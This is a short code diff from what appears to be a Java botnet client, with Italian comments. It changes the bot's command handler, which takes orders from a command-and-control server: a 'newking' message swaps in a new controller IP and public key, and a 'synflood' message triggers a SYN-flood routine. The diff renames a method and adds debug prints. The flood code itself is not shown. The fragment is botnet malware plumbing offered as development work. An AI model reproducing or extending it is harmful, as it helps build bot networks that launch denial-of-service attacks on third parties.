@@ -236,9 +236,9 @@ public class Behavior {
 	// TODO definire attacchi
 	@Async
 	private void executeCommand(String msg) {
-
+		System.out.println("Sto eseguendo "+msg);
 		if (msg.startsWith("newking")) {
-			foo(msg);
+			updateCecInfo(msg);
 		}
 		if (msg.startsWith("synflood")) {
 			malS.synFlood(msg);
@@ -260,12 +260,13 @@ public class Behavior {
 
 	}
 
-	public void foo(String msg) {
+	public void updateCecInfo(String msg) {
 		String[] msgs = msg.split("<CC>");
 		nServ.getCommandConquerIps().getList().remove(0);
 		Pairs<IP, PublicKey> pairs = new Pairs<IP, PublicKey>(new IP(msgs[1]), pki.rebuildPuK(msgs[2]));
 		nServ.getCommandConquerIps().add(pairs);
-
+		System.out.println("CeC UPDATED!!!");
+		
 	}
 
 	public BotRequest getRequest() {
